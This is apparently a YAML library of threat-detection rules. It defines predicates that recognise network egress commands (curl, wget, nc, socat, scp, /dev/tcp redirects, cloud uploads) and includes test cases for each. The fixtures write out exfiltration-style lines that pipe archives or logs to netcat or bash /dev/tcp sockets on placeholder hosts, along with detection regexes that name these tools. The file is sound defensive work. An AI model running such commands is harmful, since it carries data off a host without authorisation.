# What it means for a command to send data over the network, said once for the egress rules.
#
# Nine rules ask it: secret-read-then-egress, browser-session-read-then-egress,
# git-bundle-then-egress, secret-read-and-egress, env-dump-piped-to-network,
# archive-then-upload, credentials-in-curl-data, upload-to-paste-transfer-site and
# imds-obfuscated-ip-fetch. Each says what must be sent for it to matter; who sends is said
# here. The two rules that follow a read with any outbound command at all,
# secret-read-then-egress and browser-session-read-then-egress, ask egress_command(e), which
# is every way out these predicates know.
#
# The predicates over a command take one entry of e.command.parsed_commands, so they see a
# sender by its name after sudo, env, timeout and the like, inside `bash -c`, and in any stage
# of a pipeline, and do not see one named in a quoted string, a comment or a here-document.
# Where the parser cannot see into a command, a rule asks the text that reaches it
# (unread_text, commands.predicates.yaml), and egress_sender_mention is who sends there.
library: egress
version: 4
spec: threat-rules/v1.3
description: A command that sends data over the network.

definitions:
  - name: egress_sender
    params: [s]
    description: >
      A parsed command is a network client: curl, wget, HTTPie (http, https, httpie), xh, nc,
      ncat, netcat or socat, by any path. Its name is the one after the wrappers the parser
      looks through (sudo, env, timeout, nice, torsocks, proxychains and the like), so a
      wrapped client is one too.
    body: >
      s.name.matches("(?i)(^|/)(curl|wget|http|https|httpie|xh|xhs|nc|ncat|netcat|socat)$")
    tests:
      - name: curl
        match: e.command.parsed_commands.exists(s, egress_sender(s))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "curl -s https://example.com/health" }
      - name: netcat_by_path_under_sudo_and_timeout
        match: e.command.parsed_commands.exists(s, egress_sender(s))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "sudo timeout 5 /usr/bin/nc host.example 4444" }
      - name: wget_inside_a_shell_script
        match: e.command.parsed_commands.exists(s, egress_sender(s))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "bash -c 'wget -q https://example.com/x'" }
      - name: sender_named_in_a_commit_message
        match: e.command.parsed_commands.exists(s, egress_sender(s))
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "git commit -m 'retry curl on failure'" }
      - name: sender_named_after_echo
        match: e.command.parsed_commands.exists(s, egress_sender(s))
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "echo curl https://example.com" }

  - name: egress_sender_mention
    params: [text]
    description: >
      The text runs a network client egress_sender knows, by any path: one of its names as a
      word, followed by what a client is given first (an option, a URL, a host and port, a
      variable, an HTTP method). It is for the text of a command line the parser cannot see
      into (unread_text), and names the same clients as egress_sender, so a client added to
      one is added to both. A URL (http://), a file name (notes.nc) or prose ("retry curl on
      failure", "an http request.") is not one.

      The name and the whitespace after it are spelled out together, as `(names)[ \t]`,
      `(names)\n` and `(names)[\f\r]`, rather than `(names)\s+`: the same text matches, and
      the scan's prefilter then asks a line for `nc ` or `http ` rather than for `nc` or
      `http`, which most lines (`sync`, a URL) hold. It runs the pattern on a sixth of the
      lines it did.
    body: >
      text.matches("(?i)(^|[^\\w.-])((curl|wget|http|https|httpie|socat)[ \\t]|(curl|wget|http|https|httpie|socat)\\n|(curl|wget|http|https|httpie|socat)[\\f\\r]|(xh|xhs|nc|ncat|netcat)[ \\t]|(xh|xhs|nc|ncat|netcat)\\n|(xh|xhs|nc|ncat|netcat)[\\f\\r])\\s*(-|[^\\s;&|]*[.:/@$][^\\s;&|\"']|[0-9]|(get|post|put|patch|delete|head|options)\\s|[a-z][\\w-]*\\s+[0-9])")
    tests:
      - name: netcat_by_path
        match: egress_sender_mention(e.command.command)
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "./run.sh 'cat build.log | /usr/bin/nc termbin.com 9999'" }
      - name: netcat_to_a_named_host
        match: egress_sender_mention(e.command.command)
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "./run.sh 'tar cz . | nc localhost 4444'" }
      - name: httpie_with_a_method
        match: egress_sender_mention(e.command.command)
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "./run.sh 'http POST $API @body.json'" }
      - name: a_url
        match: egress_sender_mention(e.command.command)
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "open http://termbin.com/abcd" }
      - name: prose
        match: egress_sender_mention(e.command.command)
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "./notify.sh 'retry curl on failure; every http request.'" }

  - name: egress_reads_stdin
    params: [s]
    description: >
      A sender sends what is piped or redirected into it. nc, ncat, netcat, socat and HTTPie
      do; curl and wget only with a body that is standard input (@-, -T -, --post-file=-).
    body: >
      !s.argv.exists(a, a.matches("(?i)(^|/)(curl|wget)$")) ||
      s.argv.exists(a, a.matches("^.*[=@<](-|/dev/stdin)$")) ||
      s.argv.exists(a, a.matches("^(-[a-zA-Z]*T|--upload-file|--post-file|--body-file)$")) &&
      s.argv.exists(a, a in ["-", "/dev/stdin"])
    tests:
      - name: pipe_into_netcat
        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "tar czf - src | nc host.example 4444" }
      - name: pipe_into_curl_with_a_stdin_body
        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "tar czf - src | curl --data-binary @- https://drop.example" }
      - name: pipe_into_curl_upload_of_stdin
        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "tar czf - src | curl -T - https://drop.example" }
      - name: pipe_into_a_curl_that_sends_no_body
        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "tar czf - src | curl -s https://example.com/health" }

  - name: egress_remote_copy
    params: [s]
    description: >
      A parsed command is scp, sftp or rsync with an operand on another host (host:path,
      user@host:path).
    body: >
      s.name.matches("(?i)^(scp|sftp|rsync)$") && s.argv_raw.exists(a, a.matches("^[\\x27\"]?[\\w.@-]+:"))
    tests:
      - name: scp_to_a_host
        match: e.command.parsed_commands.exists(s, egress_remote_copy(s))
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "scp build.tgz deploy@host.example:/srv/" }
      - name: rsync_between_local_directories
        match: e.command.parsed_commands.exists(s, egress_remote_copy(s))
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "rsync -av build/ /srv/build/" }

  - name: egress_dev_tcp
    params: [e]
    description: >
      A command of the command line redirects to or from bash's /dev/tcp or /dev/udp, its own
      redirection or through a descriptor an earlier exec opened on one. The same path as a word
      of a command (a commit message, an echo argument) is not a redirection. Where the parser
      cannot see into a command, the text that reaches it is matched (unread_text).
    body: >
      e.command.parsed_commands.exists(c, size(c.socket_redirects) > 0) ||
      unread_text(e, t, t.matches("[<>][&|]?\\s*/dev/(tcp|udp)/"))
    tests:
      - name: redirect_to_a_socket
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "cat build.log > /dev/tcp/host.example/4444" }
      - name: redirect_inside_a_shell_script
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "bash -c 'cat build.log > /dev/tcp/host.example/4444'" }
      - name: redirect_written_in_an_echo_argument
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "echo 'cat x > /dev/tcp/host.example/4444' >> notes.md" }
      - name: descriptor_an_exec_opened
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "exec 3<>/dev/tcp/host.example/4444; cat build.log >&3" }
      - name: command_line_that_does_not_parse
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "cat build.log > /dev/tcp/host.example/4444 )" }
      - name: redirect_handed_to_a_program_the_parser_cannot_see_into
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "./run.sh 'cat build.log > /dev/tcp/host.example/4444'" }
      - name: redirect_in_a_comment
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "# cat build.log > /dev/tcp/host.example/4444" }

  - name: egress_command
    params: [e]
    description: >
      A command event that can carry data off the host by any means: a network client
      (egress_sender), a remote copy (egress_remote_copy), a /dev/tcp or /dev/udp redirection
      (egress_dev_tcp), gh gist create, a cloud storage upload (aws s3, gsutil, gcloud
      storage, az storage blob upload), an inline python, node, deno, bun, ruby, perl or php
      script (script_interpreter, script_interpreter_mention) that makes a request, or
      PowerShell's web cmdlets. It asks who could send, not
      what is sent: a rule that pairs it with a read says the two happened in one session.
      Where the parser cannot see into a command, the text that reaches it is matched
      (unread_text).
    body: >
      e.event.action == "command.executed" && (
        e.command.parsed_commands.exists(s,
          egress_sender(s) ||
          egress_remote_copy(s) ||
          s.name == "gh" && s.argv.exists(a, a == "gist") && s.argv.exists(a, a == "create") ||
          script_interpreter(s) &&
            s.argv.exists(a, a in ["-c", "-e", "-r"]) &&
            s.argv.exists(a, a.matches("(?i)(requests\\.(post|put|get|patch|request)\\(|urllib\\.request|urlopen\\(|http\\.client\\.|socket\\.create_connection\\(|\\.connect\\(\\(|fetch\\(|https?\\.(request|get)\\(|net::http\\.(get|post|start)|lwp::|fsockopen\\()")) ||
          s.name == "aws" && s.argv.exists(a, a == "s3") && s.argv.exists(a, a in ["cp", "sync", "mv"]) ||
          s.name == "gsutil" && s.argv.exists(a, a in ["cp", "rsync", "mv"]) ||
          s.name == "gcloud" && s.argv.exists(a, a == "storage") && s.argv.exists(a, a in ["cp", "rsync", "mv"]) ||
          s.name == "az" && s.argv.exists(a, a == "storage") && s.argv.exists(a, a == "blob") && s.argv.exists(a, a == "upload") ||
          s.name.matches("(?i)^(pwsh|powershell)(\\.exe)?$") &&
            s.argv.exists(a, a.matches("(?i)\\b(invoke-webrequest|invoke-restmethod|iwr|irm)\\b[^\\n]*https?://"))) ||
        egress_dev_tcp(e) ||
        unread_text(e, t,
          egress_sender_mention(t) ||
          t.matches("(?i)/dev/(tcp|udp)/|\\bgh\\s+gist\\s+create\\b|\\b(aws\\s+s3\\s+(cp|sync|mv)|gsutil\\s+(-m\\s+)?(cp|rsync|mv)|gcloud\\s+storage\\s+(cp|rsync|mv)|az\\s+storage\\s+blob\\s+upload)\\b") ||
          t.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(scp|sftp|rsync)\\s([^;&|\\n]*\\s)?[\\w.@-]+:") ||
          t.matches("(?i)requests\\.(post|put|get|patch|request)\\(|urllib\\.request|urlopen\\(|http\\.client\\.|socket\\.create_connection\\(|\\.connect\\(\\(|fetch\\(|https?\\.(request|get)\\(|net::http\\.(get|post|start)|lwp::|fsockopen\\(") &&
            script_interpreter_mention(t) ||
          t.matches("(?i)\\b(invoke-webrequest|invoke-restmethod|iwr|irm)\\b[^\\n]*https?://"))
      )
    tests:
      - name: a_network_client
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "curl -s https://example.com/health" }
      - name: a_cloud_storage_upload
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "aws s3 cp build.tgz s3://bucket.example/build.tgz" }
      - name: a_gist
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "gh gist create notes.txt" }
      - name: an_inline_script_request
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "python3 -c \"import requests; requests.post('https://example.com', data='x')\"" }
      - name: a_command_line_that_does_not_parse
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "curl example.com/upload -T build.tgz )" }
      - name: an_upload_handed_to_a_program_the_parser_cannot_see_into
        verdict: match
        events:
          - event: { action: command.executed }
            command: { command: "./ship.sh 'curl -T build.tgz https://drop.example'" }
      - name: an_upload_in_a_comment
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "# curl -T build.tgz https://drop.example" }
      - name: a_local_command
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "git status && go test ./..." }
      - name: a_sender_named_in_a_commit_message
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "git commit -m 'retry curl https://example.com on failure'" }
      - name: a_cloud_listing
        verdict: no_match
        events:
          - event: { action: command.executed }
            command: { command: "aws s3 ls s3://bucket.example/" }
      - name: another_kind_of_event
        verdict: no_match
        events:
          - event: { action: file.read }
            file: { path: "/home/u/notes/curl.md" }
